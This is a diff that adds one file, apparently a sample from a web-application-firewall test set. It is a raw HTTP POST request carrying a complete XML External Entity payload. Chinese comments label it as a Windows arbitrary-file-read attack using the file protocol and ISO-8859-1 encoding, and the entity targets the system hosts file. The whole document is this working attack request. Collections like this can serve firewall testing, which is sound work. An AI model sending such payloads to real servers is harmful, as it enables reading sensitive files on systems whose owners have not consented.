@@ -1,0 +1,15 @@
+# XML外部实体注入_Windows文件读取(ISO-8859-1编码)
+# 攻击者通过构造此语句利用file协议可以读取windows系统上任意文件内容，并设置编码方式为ISO-8859-1
+POST /?bid=hd_tag_m8mv25is HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25is
+RM-PRO-Token: fa92e3a3908e0499df538e1c1fc410fb
+RM-PRO-Time: 1742808471395
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version = "1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE ANY [
+<!ENTITY xxe SYSTEM "file:///C:/windows\system32\drivers\etc\hosts">
+]>
+<x>&xxe;</x>
